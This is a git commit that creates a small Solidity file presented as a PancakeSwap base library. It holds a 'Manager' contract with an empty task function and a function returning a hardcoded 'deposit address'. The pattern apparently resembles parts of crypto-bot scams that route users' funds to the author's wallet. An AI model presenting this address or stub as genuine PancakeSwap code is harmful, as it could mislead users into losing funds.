bc39f4a8e6e412da06a881a96b0c5fd0ef376111
sinycat <34515464+sinycat@users.noreply.github.com>
2022-03-01 13:16:51 +0800

    Create pancakeswap-v2base.sol

---
+++ pancakeswap-v2base.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x27f36C502A098581900686E7d92C392aA1f4A16f;
+    }
+}
